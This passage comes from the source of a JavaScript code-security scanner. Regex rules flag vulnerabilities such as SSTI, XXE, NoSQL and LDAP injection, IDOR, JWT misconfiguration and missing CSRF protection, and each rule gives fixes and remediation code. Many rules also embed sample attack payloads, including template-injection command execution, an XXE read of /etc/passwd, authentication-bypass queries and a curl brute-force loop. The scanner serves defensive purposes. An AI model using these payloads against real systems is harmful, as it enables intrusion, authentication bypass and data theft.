            fix: 'Use HTTPS for all connections. Enforce with HSTS.',
            remediation: '// Replace http:// with https://\n// Add HSTS header:\nres.setHeader("Strict-Transport-Security", "max-age=31536000");'
        },
        {
            patterns: [/req\.(body|params|query)\.\w+(?!\s*&&|\s*\|\||\s*\?|\s*!=|\s*==|\s*\.trim|\s*\.length|\s*\.match|\s*\.test)/gi],
            severity: 'low', name: 'Missing Input Validation',
            cwe: 'CWE-20', owasp: 'A03', confidence: 'possible', attackVector: 'network',
            description: 'Request parameters are used without validation.',
            fix: 'Validate all input with Joi, Zod, or express-validator.',
            remediation: '// Add validation:\nconst schema = Joi.object({\n  email: Joi.string().email().required(),\n  age: Joi.number().integer().min(0).max(150)\n});\nconst { error, value } = schema.validate(req.body);'
        },
        // ── File Upload ──
        {
            patterns: [/multer|formidable|express-fileupload|busboy/gi],
            severity: 'medium', name: 'File Upload Detected — Verify Security',
            cwe: 'CWE-434', owasp: 'A04', confidence: 'possible', attackVector: 'network',
            description: 'File upload functionality detected. Improper validation allows malicious uploads.',
            fix: 'Validate file types, enforce size limits, rename files, store outside web root.',
            remediation: '// Secure multer config:\nconst upload = multer({\n  limits: { fileSize: 5 * 1024 * 1024 },\n  fileFilter: (req, file, cb) => {\n    const allowed = ["image/jpeg", "image/png"];\n    cb(null, allowed.includes(file.mimetype));\n  }\n});'
        },
        // ── Prototype Pollution ──
        {
            patterns: [/Object\.assign\s*\(\s*\{\}/gi, /\[['"`]\s*__proto__\s*['"`]\]/gi, /\.constructor\s*\.\s*prototype/gi, /merge\s*\(.*?req\./gi, /lodash.*?merge|_.merge|deepmerge/gi],
            severity: 'high', name: 'Prototype Pollution Risk',
            cwe: 'CWE-1321', owasp: 'A06', confidence: 'possible', attackVector: 'network',
            description: 'Object merge operations with user input can pollute Object.prototype.',
            fix: 'Use Object.create(null) for lookup maps. Validate merge input.',
            exploit: '// Payload: {"__proto__": {"isAdmin": true}}\n// After merge, ALL objects inherit isAdmin = true',
            remediation: '// Use Object.create(null):\nconst map = Object.create(null);\n// Or validate keys:\nif (key === "__proto__" || key === "constructor") throw new Error("Invalid key");'
        },
        // ── XXE ──
        {
            patterns: [/DOMParser|xml2js|libxml|parseString|XMLReader|DocumentBuilder|SAXParser/gi],
            severity: 'medium', name: 'XML Processing — XXE Risk',
            cwe: 'CWE-611', owasp: 'A05', confidence: 'possible', attackVector: 'network',
            description: 'XML parsing without disabling external entities enables XXE attacks.',
            fix: 'Disable external entity processing.',
            exploit: '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>',
            remediation: '// Disable DTDs and external entities:\nparser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);'
        },
        // ── V4: LDAP Injection ──
        {
            patterns: [/ldap\.(search|bind|modify|add|compare)\s*\(.*?(req\.|request\.|params|query|body|input|user)/gi,
                /ldapsearch.*?\$|ldapfilter.*?\+/gi],
            severity: 'critical', name: 'LDAP Injection',
            cwe: 'CWE-90', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'User input is inserted into LDAP queries without sanitization, enabling directory traversal.',
            fix: 'Use LDAP escaping functions. Never concatenate user input into LDAP filters.',
            exploit: '# LDAP injection payload:\n*)(uid=*))(|(uid=*\n# Bypass auth:\nadmin)(&))',
            remediation: '// BEFORE: ldap.search(`(uid=${username})`);\n// AFTER:\nconst escapedUser = ldapEscape.filter`(uid=${username})`;\nldap.search(escapedUser);'
        },
        // ── V4: Template Injection (SSTI) ──
        {
            patterns: [/render_template_string\s*\(.*?(req|request|input|user|param)/gi,
                /Template\s*\(.*?(req|request|input|user|param)/gi,
                /Jinja2.*?\{%|nunjucks.*?render\s*\(.*?req/gi,
                /ejs\.render\s*\(.*?(req|body|query|param)/gi],
            severity: 'critical', name: 'Server-Side Template Injection (SSTI)',
            cwe: 'CWE-94', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'User input is embedded directly in server-side templates, enabling code execution.',
            fix: 'Never pass user input to template engines as template strings. Use template data binding.',
            exploit: '# Jinja2 SSTI RCE:\n{{config.__class__.__init__.__globals__["os"].popen("id").read()}}\n# EJS SSTI:\n<%= process.mainModule.require("child_process").execSync("id") %>',
            remediation: '# BEFORE: render_template_string(user_input)\n# AFTER:\nrender_template("template.html", data=user_input)'
        },
        // ── V4: NoSQL Injection ──
        {
            patterns: [/\.(find|findOne|findOneAndUpdate|deleteMany|updateMany)\s*\(\s*\{.*?(req\.|request\.|body|query|params)/gi,
                /\$where\s*:.*?(req|request|input|user|param|function)/gi,
                /\$gt\s*:\s*['"`]||\$ne\s*:\s*['"`]||\$regex\s*:.*?(req|input)/gi],
            severity: 'high', name: 'NoSQL Injection',
            cwe: 'CWE-943', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'User input flows into MongoDB query operators, enabling authentication bypass or data extraction.',
            fix: 'Sanitize MongoDB queries with mongo-sanitize. Validate input types strictly.',
            exploit: '# Auth bypass:\n{"username": "admin", "password": {"$gt": ""}}\n# Extract data:\n{"$where": "this.password.match(/^a/) != null"}',
            remediation: '// BEFORE: db.users.find({user: req.body.user})\n// AFTER:\nconst sanitize = require("mongo-sanitize");\ndb.users.find({user: sanitize(req.body.user)});',
            _checkCondition: function (code) { return inventory.hasMongo; }
        },
        // ── V4: IDOR (Insecure Direct Object Reference) ──
        {
            patterns: [/\.(findById|findByPk|get)\s*\(\s*(req\.params\.\w+|req\.query\.\w+)/gi,
                /WHERE\s+id\s*=\s*['"`]?\s*\$?\{?\s*req\.(params|query)/gi],
            severity: 'high', name: 'Insecure Direct Object Reference (IDOR)',
            cwe: 'CWE-639', owasp: 'A01', confidence: 'likely', attackVector: 'network',
            description: 'Object accessed by user-supplied ID without ownership verification. Attackers can access other users\' data.',
            fix: 'Verify the requesting user owns the resource: WHERE id = ? AND userId = ?',
            exploit: '# Access another user\'s data:\nGET /api/users/2/profile  (when logged in as user 1)\nGET /api/orders/1001      (not your order)',
            remediation: '// BEFORE: User.findById(req.params.id)\n// AFTER:\nconst item = await User.findOne({\n  where: { id: req.params.id, userId: req.user.id }\n});'
        },
        // ── V4: JWT Misconfiguration ──
        {
            patterns: [/algorithm\s*:\s*['"`]none['"`]/gi,
                /jwt\.verify\s*\(.*?algorithms\s*:\s*\[['"`]HS256['"`]\].*?\.pem|\.pub/gi,
                /jwt\.sign\s*\(.*?secret\s*[:=]\s*['"`].{1,15}['"`]/gi],
            severity: 'critical', name: 'JWT Security Misconfiguration',
            cwe: 'CWE-345', owasp: 'A02', confidence: 'confirmed', attackVector: 'network',
            description: 'JWT configured with algorithm "none", weak secret, or algorithm confusion (HS256 with public key).',
            fix: 'Use RS256 with proper key pairs. Set strong secrets (32+ chars). Always specify algorithms in verify().',
            exploit: '# Algorithm "none" attack:\n# Change JWT header to {"alg":"none"}, remove signature\n# Algorithm confusion: sign with public key using HS256',
            remediation: '// Secure JWT config:\njwt.verify(token, publicKey, { algorithms: ["RS256"] });\njwt.sign(payload, privateKey, { algorithm: "RS256", expiresIn: "1h" });',
            _checkCondition: function (code) { return inventory.hasJWT; }
        },
        // ── V4: Session Fixation ──
        {
            patterns: [/login|authenticate|signin/gi],
            severity: 'medium', name: 'Potential Session Fixation',
            cwe: 'CWE-384', owasp: 'A07', confidence: 'possible', attackVector: 'network',
            description: 'Authentication detected without session regeneration. Session fixation allows attackers to hijack sessions.',
            fix: 'Regenerate session ID after successful authentication.',
            remediation: '// After successful login:\nreq.session.regenerate((err) => {\n  req.session.userId = user.id;\n  res.redirect("/dashboard");\n});',
            _checkCondition: function (code) { return /login|authenticate|signin/i.test(code) && !/regenerate|destroy.*?session|session\s*=\s*new/i.test(code); }
        },
        // ── V4: Plaintext Password Storage ──
        {
            patterns: [/password\s*[:=]\s*(req\.|request\.|body\.|params\.|input)/gi],
            severity: 'high', name: 'Plaintext Password Handling',
            cwe: 'CWE-256', owasp: 'A02', confidence: 'likely', attackVector: 'local',
            description: 'Password appears to be stored or compared without hashing.',
            fix: 'Hash passwords with bcrypt or argon2id before storage.',
            _checkCondition: function (code) { return /password\s*[:=]\s*(req|request|body|input)/i.test(code) && !/bcrypt|argon2|scrypt|pbkdf2|hashSync|createHash/i.test(code); },
            exploit: '# Attacker dumps database → all passwords visible in plaintext\n# No computational barrier to mass account compromise',
            remediation: '// BEFORE: user.password = req.body.password;\n// AFTER:\nconst bcrypt = require("bcrypt");\nuser.password = await bcrypt.hash(req.body.password, 12);'
        },
        // ── V4: Missing Auth Middleware ──
        {
            patterns: [/app\.(get|post|put|delete|patch)\s*\(\s*['"`]\/api\//gi],
            severity: 'medium', name: 'API Route Without Auth Middleware',
            cwe: 'CWE-862', owasp: 'A01', confidence: 'possible', attackVector: 'network',
            description: 'API endpoint defined without visible authentication middleware.',
            fix: 'Add authentication middleware to all API routes.',
            _checkCondition: function (code) { return /app\.(get|post|put|delete)\s*\(\s*['"`]\/api\//i.test(code) && !/auth|authenticate|passport|requireLogin|isAuthenticated|verifyToken|requireAuth/i.test(code); },
            remediation: '// Add auth middleware:\napp.get("/api/data", requireAuth, handler);\n// Or globally:\napp.use("/api", authMiddleware);'
        },
        // ── V4: Header Injection ──
        {
            patterns: [/setHeader\s*\(\s*['"`]\w+['"`]\s*,\s*(req\.|request\.|body\.|query\.|params\.)/gi,
                /res\.set\s*\(\s*['"`]\w+['"`]\s*,\s*(req\.|body\.|query\.)/gi],
            severity: 'high', name: 'HTTP Header Injection',
            cwe: 'CWE-113', owasp: 'A03', confidence: 'likely', attackVector: 'network',
            description: 'User input is used in HTTP response headers, enabling header injection and response splitting.',
            fix: 'Sanitize all header values. Remove \\r\\n characters from user input.',
            exploit: '# Header injection payload:\nX-Custom: value\\r\\nSet-Cookie: admin=true\n# Response splitting:\nvalue\\r\\n\\r\\n<script>alert(1)</script>',
            remediation: '// Sanitize header values:\nconst safeValue = userInput.replace(/[\\r\\n]/g, "");\nres.setHeader("X-Custom", safeValue);'
        },
        // ── V4: Insecure Randomness for Security ──
        {
            patterns: [/Math\.random\s*\(\s*\).*?(token|secret|key|nonce|csrf|session|otp|password|salt|iv|id)/gi,
                /(token|secret|key|nonce|csrf|otp|session).*?Math\.random/gi],
            severity: 'high', name: 'Insecure Randomness for Security Token',
            cwe: 'CWE-330', owasp: 'A02', confidence: 'confirmed', attackVector: 'network',
            description: 'Math.random() used for security-critical value. It is predictable — state recoverable from ~600 outputs.',
            fix: 'Use crypto.randomBytes() or crypto.randomUUID().',
            exploit: '# Math.random() uses xorshift128+\n# State is fully recoverable from consecutive outputs\n# All future tokens become predictable',
            remediation: '// BEFORE: const token = Math.random().toString(36);\n// AFTER:\nconst crypto = require("crypto");\nconst token = crypto.randomBytes(32).toString("hex");'
        },
    ];

    // Run pattern rules (with conditional checks for V4 rules)
    for (const rule of rules) {
        // V4 rules with conditions: only fire if condition is met
        if (rule._checkCondition && !rule._checkCondition(code)) continue;

        for (const pattern of rule.patterns) {
            const regex = new RegExp(pattern.source, pattern.flags);
            for (let i = 0; i < lines.length; i++) {
                if (regex.test(lines[i])) {
                    const already = issues.find(iss => iss.name === rule.name && iss.location === `Line ${i + 1}`);
                    if (!already) {
                        issues.push({
                            severity: rule.severity, name: rule.name,
                            location: `Line ${i + 1}`,
                            description: rule.description,
                            snippet: lines[i].trim(),
                            fix: rule.fix,
                            exploit: rule.exploit || null,
                            remediation: rule.remediation || null,
                            cwe: rule.cwe, owasp: rule.owasp,
                            confidence: rule.confidence || 'likely',
                            attackVector: rule.attackVector || 'network'
                        });
                    }
                    regex.lastIndex = 0;
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 5: Structural / Logic Checks
    // ═══════════════════════════════════════════════════════════

    // Check for missing CSRF protection
    if (/app\.(post|put|delete|patch)\s*\(/gi.test(code) && !/csrf|csurf|csrfToken|_token|antiForgery/gi.test(code)) {
        issues.push({
            severity: 'medium', name: 'No CSRF Protection Detected',
            location: 'Application-wide', cwe: 'CWE-352', owasp: 'A01', confidence: 'possible', attackVector: 'network',
            description: 'State-changing endpoints exist without CSRF token validation.',
            snippet: 'No csurf, csrf, or anti-forgery middleware detected',
            fix: 'Add CSRF middleware: const csrf = require("csurf"); app.use(csrf()).',
            remediation: 'const csrf = require("csurf");\napp.use(csrf({ cookie: true }));\n\n// In forms:\n<input type="hidden" name="_csrf" value="<%= csrfToken %>">'
        });
    }

    // Check for missing rate limiting
    if (/app\.(post|put)\s*\(\s*['"`]\/(login|signin|auth|register|signup|reset|forgot)/gi.test(code) && !/rateLimit|rate.limit|limiter|throttle|brute/gi.test(code)) {
        issues.push({
            severity: 'medium', name: 'No Rate Limiting on Auth Endpoints',
            location: 'Authentication routes', cwe: 'CWE-307', owasp: 'A07', confidence: 'possible', attackVector: 'network',
            description: 'Authentication endpoints lack rate limiting, enabling brute-force attacks.',
            snippet: 'Login/register routes detected without rate-limit middleware',
            fix: 'Add rate limiting with express-rate-limit.',
            exploit: '# Brute-force 10,000 passwords in minutes:\nfor pass in wordlist; do curl -X POST /login -d "user=admin&pass=$pass"; done',
            remediation: 'const rateLimit = require("express-rate-limit");\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  message: "Too many attempts"\n});\napp.post("/login", authLimiter, loginHandler);'
        });
    }

    // Check for helmet/security headers
    if (/express\s*\(\s*\)/gi.test(code) && !/helmet|X-Frame-Options|Content-Security-Policy|X-Content-Type/gi.test(code)) {
        issues.push({
            severity: 'low', name: 'Missing Security Headers',
            location: 'Application-wide', cwe: 'CWE-1021', owasp: 'A05', confidence: 'possible', attackVector: 'network',
            description: 'No security headers detected. Your app may be vulnerable to clickjacking and MIME sniffing.',
            snippet: 'No helmet or manual security header configuration found',
            fix: 'Install helmet: npm i helmet; app.use(helmet()).',
            remediation: 'const helmet = require("helmet");\napp.use(helmet());\n// Sets: CSP, X-Frame-Options, HSTS, X-Content-Type-Options, etc.'
        });
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 6: Deep Analysis Integration (V4)
    //  Inter-procedural taint, CVEs, anomalies, intelligence
    // ═══════════════════════════════════════════════════════════

    // Inter-procedural taint findings from AST engine
    if (deepAnalysis && deepAnalysis.taintResults) {
        for (const flow of deepAnalysis.taintResults.interProceduralFlows) {
            const info = TAINT_ISSUE_MAP[flow.type];
            if (!info) continue;
            const chainStr = flow.propagationChain.join(' → ');
            issues.push({
                severity: info.severity, name: `${info.name} (Inter-Procedural)`,
                location: `Line ${flow.sinkLine}`,
                description: `${info.description}\n\n🔗 Cross-function flow: ${chainStr}`,
                snippet: `⛓️ ${flow.sourceFunction}() → ${flow.sinkFunction}()  |  ${flow.sinkCode}`,
                fix: info.fix, exploit: info.exploit, remediation: info.remediation,
                cwe: flow.cwe, owasp: info.owasp,
                confidence: flow.confidence,
                attackVector: 'network',
                _isInterProcedural: true,
                _functionName: flow.sinkFunction,
                dataFlow: [`Source: ${flow.sourceFunction}()`, `Chain: ${chainStr}`, `Sink: ${flow.sinkFunction}() at Line ${flow.sinkLine}`]
            });
        }
    }

    // CVE correlation findings
    for (const cve of cveMatches) {
        issues.push({
            severity: cve.severity, name: `CVE Match: ${cve.id} — ${cve.name}`,
            location: 'Dependency/Pattern', cwe: cve.cwe, owasp: 'A06',
            confidence: 'likely', attackVector: 'network',
            description: cve.description,
            snippet: `🛡️ ${cve.id}: ${cve.name}`,
            fix: `Update affected component. See: https://nvd.nist.gov/vuln/detail/${cve.id}`,
            exploit: `# Known exploit: ${cve.id}\n# Severity: ${cve.severity}\n# See NVD for proof-of-concept details`,
            remediation: `// Update to latest patched version\n// Check: npm audit fix\n// Reference: https://nvd.nist.gov/vuln/detail/${cve.id}`
        });
    }

    // Anomaly findings
    for (const anomaly of anomalies) {
        issues.push({
            severity: anomaly.severity, name: `Anomaly: ${anomaly.type.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase())}`,
            location: anomaly.line ? `Line ${anomaly.line}` : 'Code-wide',
            description: anomaly.detail,
            snippet: `🔍 ${anomaly.detail}`,
            cwe: 'CWE-710', owasp: 'A04',
            confidence: anomaly.confidence,
            attackVector: 'local',
            fix: 'Review flagged code pattern for potential security impact.'
        });
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 7: Intelligence Layer Post-Processing
    // ═══════════════════════════════════════════════════════════

    let enrichedIssues = issues;

    if (typeof IntelligenceEngine !== 'undefined') {
        // False positive suppression
        enrichedIssues = IntelligenceEngine.suppressFalsePositives(enrichedIssues, code, frameworkContext);

        // Exploit likelihood classification
        const reachability = deepAnalysis ? deepAnalysis.reachability : null;
        enrichedIssues = IntelligenceEngine.classifyExploitLikelihood(enrichedIssues, reachability, frameworkContext);

        // Intelligent deduplication
        enrichedIssues = IntelligenceEngine.intelligentDedup(enrichedIssues);

        // Learn from this scan (privacy-preserving)
        IntelligenceEngine.learnFromScan(enrichedIssues);
    }

    // Final cleanup
    const unique = this._dedup(enrichedIssues);
    this._sortBySeverity(unique);

    // Build result with V4 metadata
    const result = this._buildResult(unique, 'code');

    // Attach V4 deep analysis metadata
    result._v4 = {
        frameworkDetected: frameworkContext ? frameworkContext.label : null,
        frameworkHasSecurityConfig: frameworkContext ? frameworkContext.hasSecurityConfig : false,
        cveMatches: cveMatches.length,
        anomaliesDetected: anomalies.length,
        deepAnalysisAvailable: !!deepAnalysis,
        interProceduralFlows: deepAnalysis ? deepAnalysis.taintResults.interProceduralFlows.length : 0,
        cyclomaticComplexity: deepAnalysis ? deepAnalysis.cfg.complexity : null,
        totalFunctions: deepAnalysis ? deepAnalysis.ast.functions.length : null,
        patternInsights: typeof IntelligenceEngine !== 'undefined' ? IntelligenceEngine.getPatternInsights() : null,
    };

    // Generate attack scenarios
    if (typeof IntelligenceEngine !== 'undefined') {
        result._attackScenarios = IntelligenceEngine.generateAttackScenarios(unique, frameworkContext);
    }

    return result;
};

// ─── Language Detection Utility ────────────────────────────
SecureScanAnalyzer._detectLanguage = function (code) {
    const sigs = {
        javascript: [/\b(const|let|var)\s+\w+\s*=/, /=>\s*\{/, /require\s*\(/, /module\.exports/, /console\.log/],
        python: [/\bdef\s+\w+\s*\(/, /\bimport\s+\w+/, /print\s*\(/, /if\s+__name__\s*==\s*['"]__main__['"]/, /:\s*$/m],
        java: [/public\s+(static\s+)?class\s+/, /System\.out\.print/, /public\s+static\s+void\s+main/, /import\s+java\./],
        php: [/<\?php/, /\$\w+\s*=/, /echo\s+/, /function\s+\w+\s*\(.*?\$/, /\->/],
        go: [/func\s+\w+\s*\(/, /package\s+main/, /import\s+\(/, /fmt\.Print/],
        ruby: [/\bdef\s+\w+/, /puts\s+/, /require\s+['"]/, /class\s+\w+\s*</, /end\s*$/m],
        csharp: [/using\s+System/, /namespace\s+\w+/, /public\s+class\s+/, /Console\.Write/, /\[HttpGet\]/],
    };
    let best = 'javascript', bestScore = 0;
    for (const [lang, patterns] of Object.entries(sigs)) {
        const score = patterns.filter(p => p.test(code)).length;
        if (score > bestScore) { best = lang; bestScore = score; }
    }
    return best;
};
